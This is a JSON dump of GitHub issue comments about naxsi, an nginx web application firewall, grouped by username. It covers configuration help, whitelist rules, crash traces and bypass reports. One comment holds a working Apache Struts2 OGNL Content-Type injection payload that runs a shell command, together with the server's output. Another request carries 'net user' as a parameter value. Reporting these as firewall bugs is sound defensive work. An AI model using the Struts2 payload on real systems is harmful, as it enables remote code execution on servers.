    "jaygooby": "Watch out for using paths you might expect the shell to expand. I was getting a Unable to create the index/collection : nxapi events, Error: create() takes at least 5 arguments (5 given) and it looked like the error log file had been ignored:\n```\n./nxtool.py -c nxapi.json --files=~/nginx/log/error.log\nsize :1000\nUnable to create the index/collection : nxapi events, Error: create() takes at least 5 arguments (5 given)\nWARNING:root:List of files :[]\n```\nThe ~ didn't get expanded by python. But using:\n./nxtool.py -c nxapi.json --files=/Users/jay/nginx/log/error.log\ncaused all the log entries to get added to the nxapi elasticsearch index.. I'd assumed that the naxsi_flag_enable and naxsi_flag_learning flags at the server{} level already did this (I realised they didn't after testing), so it would be good to add a note to the wiki.. ",
    "Yooke": "My strange place is why block this request in leaning mode.  this request is successful when i set SecRulesDisabled. now, i only can join this url to white list ?. Thanks @buixor  @sabban !\nI understand. I'm sorry, asking such a simple question, i will read wiki again.\n. ",
    "linxisp": "Hello Buixor,\nI thought about that but i'm getting logs for naxsi rules included in the subfolders.\nHow can that be possible if the rules arent included?\nThank you. ",
    "edoz90": "Hi!\nYes, NGINX is used to proxy the traffic to PHP.\nI esplicitly used fastcgi_param CONTENT_TYPE $content_type; to forward the header to PHP but it wasn't necessary.\nThis was just a \"\"PoC\"\" of the article that I read so I don't use that PHP code in production (and no one should).\nI thought too to whitelist only encodings accepted by the backend but what if a user use a legit request for a non-whitelisted encoding beacuse che used that in his browser? I know that the request and payload should be always double checked on server-side but the article states that the application should be accessible from anyone and I didn't know NGINX url-decoded some encodings.\nSorry if I was not clear and thank you for your response.. ",
    "qingweiqm": "we know that attacker will try to encode the attack payload with URL encoding or base64 encoding and so on, how does the naxsi to deal with this kind of encode attack, I just try url encoding attack, and found it's working....... ",
    "z0r0": "```json\nFILE: csp_report_body.json\n\n{\n    \"csp-report\": {\n        \"document-uri\": \"http://example.com/signup.html\",\n        \"referrer\": \"\",\n        \"blocked-uri\": \"http://example.com/css/style.css\",\n        \"violated-directive\": \"style-src cdn.example.com\",\n        \"original-policy\": \"default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports\",\n        \"disposition\": \"report\"\n    }\n}\n\nExecute:  curl --data csp_report_body.json --header \"Content-Type: application/json\" http://127.0.0.1:80/foo.php\n\nTo test:\nPaste the body in here: https://jsonlint.com/\n```. Hows about this? #421 . My apologies, \nI'll see if i can get to writing a test or two within the next few days for it.. Made #438 for a quick fix.. ",
    "fabianfrz": "same seems to happen without HTTPv2. looks like including the main rules (naxsi_config/naxsi_core.rules) does fix the problem but in that case naxsi is still misbehaving (it should not block for no reason).\nBTW: can I include that configuration file in BSD licensed software?. @buixor would it be possible to append ?reason=no-rules-loaded to the denied URL in that special case. Also in this case it means that lib* detection directives cannot be used without other rules?\nJust for documentation purposes - I want to use it with rules but it will be strange to disable everything if the user does not add rules to the configuration. @buixor thanks for your patch - it seems to fix the issue. You may close the ticket now if you don't need it anymore. Will probably take some time until it will be in the public repositories but that's not your problem.. ",
    "calve": "Thanks for the merge. Sorry I did not took time to add proper tests. On the other hand, there is no test for PUT requests aswell. Shall we copy/paste the tests for POST or factorise them ?\n. ",
    "limithit": "Of course, this problem can be reproduced, and I tested a lot and it was the same result.\n```\nGET http://localhost/ HTTP/1.1\nUser-Agent: Fiddler\nHost: localhost\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -tupln').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n```\nHTTP/1.1 200\nServer: nginx\nDate: Mon, 09 Jul 2018 11:48:20 GMT\nTransfer-Encoding: chunked\nConnection: keep-alive\nSet-Cookie: JSESSIONID=8DFD4B669CD3843B00046108399937DF; Path=/; HttpOnly\nContent-Language: zh-CN\nc33\n(No info could be read for \"-p\": geteuid()=1001 but you should be root.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:45065           0.0.0.0:               LISTEN      -             \ntcp        0      0 0.0.0.0:6379            0.0.0.0:               LISTEN      -             \ntcp        0      0 0.0.0.0:111             0.0.0.0:               LISTEN      -             \ntcp        0      0 0.0.0.0:22              0.0.0.0:               LISTEN      -             \ntcp        0      0 127.0.0.1:631           0.0.0.0:               LISTEN      -             \ntcp        0      0 127.0.0.1:25            0.0.0.0:               LISTEN      -             \ntcp6       0      0 :::8009                 :::                    LISTEN      -             \ntcp6       0      0 :::3306                 :::                    LISTEN      -             \ntcp6       0      0 :::6379                 :::                    LISTEN      -             \ntcp6       0      0 :::111                  :::                    LISTEN      -             \ntcp6       0      0 :::8080                 :::                    LISTEN      -             \ntcp6       0      0 :::22                   :::                    LISTEN      -             \ntcp6       0      0 ::1:631                 :::                    LISTEN      -             \ntcp6       0      0 ::1:25                  :::                    LISTEN      -             \ntcp6       0      0 :::40644                :::                    LISTEN      -             \nudp        0      0 0.0.0.0:53778           0.0.0.0:                           -             \nudp        0      0 0.0.0.0:631             0.0.0.0:                           -             \nudp        0      0 0.0.0.0:672             0.0.0.0:                           -             \nudp        0      0 127.0.0.1:704           0.0.0.0:                           -             \nudp        0      0 0.0.0.0:23279           0.0.0.0:                           -             \nudp        0      0 0.0.0.0:5353            0.0.0.0:                           -             \nudp        0      0 0.0.0.0:68              0.0.0.0:                           -             \nudp        0      0 0.0.0.0:111             0.0.0.0:                           -             \nudp        0      0 0.0.0.0:57697           0.0.0.0:                           -             \nudp6       0      0 :::12945                :::                                -             \nudp6       0      0 :::672                  :::                                -             \nudp6       0      0 :::5353                 :::                                -             \nudp6       0      0 :::34134                :::                                -             \nudp6       0      0 :::111                  :::                                -             \nudp6       0      0 :::37053                :::                                -               \n0\n```\n.  This is my actual temporary scheme:\nnginx\n if ($content_type ~* \"multipart/form-data\") {\n  return 403;\n}\n. This seems to be the result of content-type overflow @buixor . When I tested it, the log indeed recorded the deleted request, but I can actually execute the webshell. \nmaybe you have to reproduce the vulnerability environment to understand, so let's just give up.@buixor . I have repaired this bug and submitted the merge request. @buixor . ",
    "PhilWicke": "Thank you. I have used the example configuration before and it did not activate the rules. Neither did my current nginx.conf posted above. I've tried to use the example configuration from the wiki and now have this config:\n```nginx\n    user nginx;\n    worker_processes auto;\n    error_log /var/log/nginx/error.log;\n    pid /run/nginx.pid;\ninclude /usr/share/nginx/modules/*.conf;\nevents {\nworker_connections 1024;\n}\n\nhttp {\n    include /etc/nginx/naxsi_core.rules;\n\n    add_header X-Frame-Options SAMEORIGIN always;\n    add_header X-XSS-Protection \"1; mode=block\" always;\n    add_header Content-Security-Policy \"frame-ancestors 'self'\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n\n    client_header_timeout 3000;\n    client_body_timeout 3000;\n    fastcgi_read_timeout 3000;\n    client_max_body_size 32m;\n    fastcgi_buffers 8 128k;\n    fastcgi_buffer_size 128k;\n\n    log_format scripts '$document_root$fastcgi_script_name > $request';\n\n\n   log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n                  '$status $body_bytes_sent \"$http_referer\" '\n                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile            on;\n    tcp_nopush          on;\n    tcp_nodelay         on;\n    keepalive_timeout   65;\n    types_hash_max_size 2048;\n\n    include             /etc/nginx/mime.types;\n    default_type        application/octet-stream;\n\nserver {\n    add_header X-Frame-Options SAMEORIGIN always;\n    add_header X-XSS-Protection \"1; mode=block\" always;\n    add_header Content-Security-Policy \"frame-ancestors 'self'\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n\n    access_log /var/log/nginx/naxsi_access.log;\n    error_log /var/log/nginx/naxsi_error.log debug;\n\n\n    # example server config\n    location / {\n    SecRulesEnabled;\n    #Define where blocked requests go\n    DeniedUrl \"/50x.html\";\n    # CheckRules, determining when naxsi needs to take action\n    CheckRule \"$SQL >= 8\" BLOCK;\n    CheckRule \"$RFI >= 8\" BLOCK;\n    CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n    CheckRule \"$EVADE >= 4\" BLOCK;\n    CheckRule \"$XSS >= 8\" BLOCK;\n    #naxsi logs goes there\n    error_log /var/log/nginx/naxis_server_error.log;\n    }\n       error_page   500 502 503 504  /50x.html;\n       #This is where the blocked requests are going\n       location = /50x.html {\n        return 418; #I'm a teapot \\o/\n    }\n}\n\n\n  proxy_connect_timeout       600;\n  proxy_send_timeout          600;\n  proxy_read_timeout          600;\n  send_timeout                600;\n    uwsgi_connect_timeout 750s;\n    fastcgi_send_timeout 600s;\n\ninclude /etc/nginx/conf.d/*.conf;\n}\n\n``. I'm sorry, but in every example and the defaultnginx.conftheserverblock is inside thehttpone. \nSee [HERE](https://www.nginx.com/resources/wiki/start/topics/examples/full/) and [HERE](https://github.com/nbs-system/naxsi/wiki/naxsi-setup#example-configuration). If I have it outside the http, I receivenginx: [emerg] \"server\" directive is not allowed here. . Yes, the very first snippet shows mynginxconfiguration. Also, if the rules had a wrong syntax (as I tested before) this would result in an error startingnginx, therefore thenginxis running with thenaxsiplugin. It might be nothing wrong with thenginx.conf, but I don't know where else I can find the bug/problem.. Hello,\nthanks for replying to the issue. Yes, it still persists. If by full configuration you mean the entire nginx.conf, it is the one I've posted above. Not sure where there should be alisten` or what it does.  \nUnless, I find a solution I'll have to re-write a lot of code. And I appreciate this project and would really like to make use of it. Let me know if there's any more information I can provide.. @diadal unfortunately, I cannot fix the issue. I think I've done everything according to the instructions, but there is zero application of the rules. Let me know if you progress.. @bobziuchkovski thank you for the reply. \nThere are indeed three .conf files. Again, I have inherited the system and have very little knowledge. So, the server / locations that I can find in  there are the following:\nserver {\nserver_name  myserverName ourwebsite.com;\nlocation /downloads/ {\nroot /srv;\nsome X-XSS protection protocols\nlocation / {\nproxy_pass http://127.0.0.1:8080;\n}\n}\nand in a different file, things like this:\nlocation ~* \\.(css|js|gif|jpe?g|png)$ {\nexpires 1d;\nlog_not_found off;\n}\nlocation / {\ntry_files $uri $uri/ $uri.html =404;\nlog_not_found off;\n}\n. ",
    "diadal": "am facing same issue have tried alot config noting works @PhilWicke were you able to fix this issue??. I guess the plugin naxsi no longer working have done everything no error log in nginx but naxsi still not working. ",
    "bobziuchkovski": "@PhilWicke I'm not sure the server block or location block you posted is actually being used by your live site(s).  The following towards the end of your config file sticks out to me:\ninclude /etc/nginx/conf.d/*.conf;\nCould you post the contents of those included *.conf files?  I'm guessing you might have other server/location blocks defined in those files, possibly without the naxsi config directives in them?. @PhilWicke Aha.  Yeah, I think it's the config file with the server_name myserverName ourwebsite.com block that is going to need the naxsi config directives.  I can't tell about the other file with the additional location blocks.  It depends on the context of where those are being included, but it's possible those might need some directives as well.\nIt looks like the config files are possibly a little disorganized.  You might want to read through some various nginx config guides/examples to try to refactor/reorganize the config so that it's easy to follow and makes sense to you and others as whole.  That might make it a little easier to troubleshoot.. ",
    "InvokerFury": "its say incorrect when i apply your rule sir..\nnginx: [emerg] Naxsi-Config : Incorrect line BasicRule wl:1100 (../naxsi/naxsi_src//naxsi_skeleton.c/474)... in /usr/local/nginx-naxsi/conf.d/naxsi/rules/xxxx.rules:56\nnginx: configuration file /usr/local/nginx-naxsi/nginx-naxsi.conf test failed. solved sir..\nthanks for your help.. have a nice day. ",
    "youzizzz": "Ok, verified, it\u2019s true that my personal negligence caused this problem. The file name was written as naisi..., sorry, thank you for your answer.. ",
    "ManuRgh": "\nWhile it's possible, it sounds like a super-duper bad idea, and it's unlikely that someone will help you to shoot yourself in the foot :/\nWhat is your usecase exactly?\n\nNaxsi seems very good and easy to use, but for each web application a lot of learning time is spent to implement whitelists.\nSo I thought if it is possible to act in reverse, accept everything by default, and implement minimum security rules, for do not have to work too much every time a web application is published.. ",
    "dertin": "Hi @jvoisin \nI saw something to activate LearningMode But I did not find documentation of how it should be used and what it is for. I guess that generates rules from the use of the web application.\nI also found the following.\nhttps://github.com/nbs-system/nxtool-ng\nBut I still do not know how it works. I try to read the documentation, but my mother tongue is not English, that makes it a bit difficult for me.\n. ",
    "loki008": "naxsi.rules:\nSecRulesEnabled;\nDeniedUrl \"/RequestDenied\";\nCheckRule \"$SQL >= 8\" LOG;\nCheckRule \"$RFI >= 8\" LOG;\nCheckRule \"$TRAVERSAL >= 8\" LOG;\nCheckRule \"$EVADE >= 8\" LOG;\nCheckRule \"$XSS >= 8\" LOG;\nCheckRule \"$CMD >= 8\" BLOCK;\nCheckRule \"$INCLUSION >= 8\" LOG;\nnaxsi_core.rules:\nMainRule \"rx:(?:count|length|sleep|char|ascii|hex|unhex|conv|benchmark|md5)\\(\" \"mz:BODY|ARGS|$HEADERS_VAR:Cookie\" \"s:$SQL:8\" id:1021;\nif use paymentNo=\"md5\"\nrequest\nGET http://test.fc.17.com/p/order/v3/order/select/orderList?beginTime=1534089600000&endTime=1542124799999&paymentNo=md5&partner=12219&orderType=104 HTTP/1.1\nresponse\nHTTP/1.1 200 OK\nif use paymentNo=\"md5(\"\nrequest\nGET http://test.fc.17.com/p/order/v3/order/select/orderList?beginTime=1534089600000&endTime=1542124799999&paymentNo=md5(&partner=12219&orderType=104 HTTP/1.1\nresponse\nHTTP/1.1 504\nif change naxsi_core.rules\nMainRule \"rx:count|length|sleep|char|ascii|hex|unhex|conv|benchmark|md5\" \"mz:BODY|ARGS|$HEADERS_VAR:Cookie\" \"s:$SQL:8\" id:1021;\nif use paymentNo=\"md5\"\nrequest\nGET http://test.fc.17.com/p/order/v3/order/select/orderList?beginTime=1534089600000&endTime=1542124799999&paymentNo=md5&partner=12219&orderType=104 HTTP/1.1\nresponse\nHTTP/1.1 504\nnaxsi.log:\n2018/11/12 15:09:20 [error] 16685#0: *38368 NAXSI_FMT: ip=172.29.110.96&server=test.fc.17.com&uri=/p/operate/api/agencys&vers=0.56&total_processed=6&total_blocked=4&config=block&cscore0=$CMD&score0=8&zone0=ARGS&id0=1601&var_name0=serial_number, client: 172.29.110.96, server: 10.10.10.10, request: \"GET /p/operate/api/agencys?pageSize=10&serial_number=net%20user HTTP/1.1\", host: \"test.fc.17.com\", referrer: \"http://test.fc.17.com/serviceCenter/list\nDisplay block log only\uff0cno display log log. After matching rules, there is no log record for access.log.\nHTTP packet analysis using fiddler\uff0cdisplay 504 error. if use burpSuite analysis\uff0cresponse is null.. hello @buixor \uff1a\uff09\ntoday I find wrong information in the test\uff1a\ns: /tmp/naxsi-master/naxsi_src/naxsi_runtime.c:849: ngx_http_nx_log: Assertion `strlen(fmt_config) != 0' failed.\n2018/11/14 13:05:21 [error] 55326#0: nginx coredump by signal 6 (SIGABRT)\nnginx: worker process[0x4bd88d]\n/lib64/libpthread.so.0(+0xf6d0)[0x7f0e864b96d0]\n/lib64/libc.so.6(gsignal+0x37)[0x7f0e85ac2277]\n/lib64/libc.so.6(abort+0x148)[0x7f0e85ac3968]\n/lib64/libc.so.6(+0x2f096)[0x7f0e85abb096]\n/lib64/libc.so.6(+0x2f142)[0x7f0e85abb142]\n/opt/app/nginx/modules//ngx_http_naxsi_module.so(ngx_http_nx_log+0x176)[0x7f0e835eb056]\n/opt/app/nginx/modules//ngx_http_naxsi_module.so(ngx_http_output_forbidden_page+0x64)[0x7f0e835eb5f1]\n/opt/app/nginx/modules//ngx_http_naxsi_module.so(+0x427fa)[0x7f0e835f27fa]\nnginx: worker process(ngx_http_core_rewrite_phase+0x7)[0x474fda]\nnginx: worker process(ngx_http_core_run_phases+0x23)[0x470993]\nnginx: worker process(ngx_http_handler+0xf6)[0x470aad]\nnginx: worker process(ngx_http_process_request+0x7a)[0x479ebf]\nnginx: worker process[0x47be46]\nnginx: worker process[0x47c10b]\nnginx: worker process[0x47c485]\nnginx: worker process[0x46492e]\nnginx: worker process(ngx_process_events_and_timers+0xa0)[0x45c0ba]\nnginx: worker process[0x4632e2]\nnginx: worker process(ngx_spawn_process+0x440)[0x460896]\nnginx: worker process(ngx_master_process_cycle+0x501)[0x463cee]\nnginx: worker process(main+0xafb)[0x445ad5]\n/lib64/libc.so.6(__libc_start_main+0xf5)[0x7f0e85aae445]\nnginx: worker process[0x444529]\n2018/11/14 13:05:21 [notice] 49165#0: signal 17 (SIGCHLD) received\n2018/11/14 13:05:21 [alert] 49165#0: worker process 55326 exited on signal 6 (core dumped)\n2018/11/14 13:05:21 [notice] 49165#0: start worker process 55328\n2018/11/14 13:05:21 [notice] 49165#0: signal 29 (SIGIO) received\n2018/11/14 13:05:21 [notice] 55328#0: sched_setaffinity(0x0000000000000001)\nLater I change naxsi code tags to 0.56\uff0cand solved the problem.\nNaxsi_runtime.c is the main reason for this failure.\nThank you.\n. hi @buixor \nnginx\uff1ahttp://nginx.org/download/nginx-1.7.9.tar.gz \nnaxsi\uff1ahttps://codeload.github.com/nbs-system/naxsi/zip/master\nconfigure inaxsi.rules\uff1aCheckRule \"$SQL >= 8\" LOG;\nif i access http://www.naxsi.com/?a=select11\nwrong information\uff1a\n\nlater I change naxsi\uff08https://codeload.github.com/nbs-system/naxsi/zip/0.56\uff09\nconfigure inaxsi.rules\uff1aCheckRule \"$SQL >= 8\" LOG;\nif i access http://www.naxsi.com/?a=select11\n\nIs there a problem with the Naxis version or something else?\nyou can try.\naccording to nginx debug log\uff0ci discover information\uff1a\ns: /tmp/naxsi-master/naxsi_src/naxsi_runtime.c:849: ngx_http_nx_log: Assertion `strlen(fmt_config) != 0' failed.\nI hope you can understand this information.\nThank you very much.\n. 2018/11/26 11:12:52 [error] 10703#0: *88231 NAXSI_FMT: ip=172.29.28.205&server=test.fc.17shihui.com&uri=/p/bankroll/v2/accounts/apply&learning=0&vers=0.56&total_processed=22&total_blocked=3&block=1&zone0=BODY&id0=20&var_name0=, client: 172.29.28.205, server: 10.120.180.54, request: \"POST /p/bankroll/v2/accounts/apply HTTP/1.1\", host: \"test.fc.17shihui.com\", referrer: \"http://test.fc.17shihui.com/bankrollAccount/apply\"\nwhat is id0=20\uff1f. Internal rules has not id\uff1a20\nhow many has Internal rules\uff1fwhat is id\uff1f\n. which other  Internal rules are there \uff0cbesides id1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18?. The last one is id:19\uff0cno id\uff1a20\uff0cI want to add all Internal rules to the whitelist, so I need all Internal rules ID number\uff0cthanks. ```http\nPOST 'http://test.11.com/p/bankroll/v2/accounts/apply' \n'Origin: http://test.11.com' \n'Accept-Encoding: gzip, deflate' \n'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8'\n'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'\n'Content-Type: application/json' \n'Accept: /' \n'Referer: http://test.11.com/bankrollAccount/apply' \n'Cookie: PHPSESSID=e3sfs2oc8qq173pbraq8haq521; \nportal_name=006%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%8302; \nwm__sess=UD%2Byxi%2B1bvmTBqHMuPyfi8ZUsy3k2Kj24pcYcH7YusGSm5VC2k8AZ%2FX42406dcZHZ%2FfUkotR%2FhqqjWh2pJel6O9YpvJw2k%2Fnk9mVZSa%2BjoyqkJS6B5cvXYJJcET5Vp%2BwkYbsqoapYS7eSR%2BqAFrXblQTvAorbyTbd91F5xdeEoA1KoNv4KCLLenllIFGJadH0KGASblFVVZePMGk4%2BZFs4G7iK8ScbmBuzq59yuPNi8QGfDaCweHTCj3uN4abPz%2FsSD8rySTmRRG3pOQeL6sEPztvlgqS0%2BzR2qtGp636R%2BYXauaP3rs980DQH9mOEW29eyK6807eELLrO3%2FarQTnbZhC6WrOkhq726PstBa5CYjle6DoNzmbTwG610%2B8vjnWwtvBxAn%2BZM8Q4zbE6Mb6ogMksu%2BMWZnTxAw2wokNHk%3D; \ntoken=16082384535bfb6bc314e21484742734' -H 'Connection: keep-alive' \n--data-binary $'{\"cert_name\":\"test_zx0\",\"cert_number\":\"911111111111111111\",\"link_phone\":\"12201008790\",\"bank_code\":\"CCB\",\"bank_name\":\"\\u4e2d\\u56fd\\u5efa\\u8ace\\u00f6\\u884c\",\n\"bank_branch\":\"\\u5927\\u1b81\\u634f\\u774cb81\\u634f\\u774c\",\"bank_city\":\"1\",\"undefined\":\"1\",\"bank_province\":\"3\",\"bank_card\":\"62141111021111111\",\"cert_type\":2,\n\"payment\":\"hangxing1\",\"re_payment\":\"hangxing1\",\"phone\":\"12201008790\",\"sms_verify_code\":\"1188\"}' --compressed\n```. \nNaxsi log and nginx error log are written in naxsi.log. Is there any way to separate them? \nnginx log written in nginx error.log,naxsi log written in naxsi.log\nthanks. ",
    "mautanya": "Hello @buixor ,\nThanks for replay, so the whitelist must be : \n\nBasicRule wl:1015 \"mz:$ARGS_VAR:p|$URL_X:/lol/index-promo?\";\n\nsorry im new in naxsi :). ",
    "tjosm": "Thanks for the quick reply @jvoisin. I tried adding above rule, but it doesn't appear to be working. I'm in the learning mode. The same error still gets recorded in the log.. ",
    "he2ss": "Hi wqazo,\nFirst, you need to know, using NAXSI without doing some whitelisting will necessarily block some requests identified as suspicious following default rules. \nYou can follow the documentation to write whitelist rules. For your example, the whitelist is : \nBasicRule wl:1315 \"mz:$HEADERS_VAR:cookie\";\nThis rule will authorize the id 1315 on the header variable cookie on all URIs. If you want to limit this rule only on the targeted URI, write the rule is :\nBasicRule wl:1315 \"mz:$URL:/pmx/js/export.js|$HEADERS_VAR:cookie\";. ",
    "indieocean": "Nope. It just hangs. No errors or anything. Thats whats odd.\nOn Thu, Mar 14, 2019 at 8:20 AM buixor notifications@github.com wrote:\n\nI don't really understand how naxsi would lead to a timeout, is there any\nlogs produced after you added the whitelists ?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/459#issuecomment-472850505,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AACrQ3MOl2-hh2zqqaExqmyKrNhvbyPjks5vWkytgaJpZM4bvWBA\n.\n. \n",
    "fernandomariano": "Sure, I will do that soon.. ",
    "wargio": "Add braces {} on that else if. Add braces {} on that else. Add braces {} on that else. ",
    "smagnin": "It shouldn't be \"learning-drop\" instead of \"learning\" ?. "
}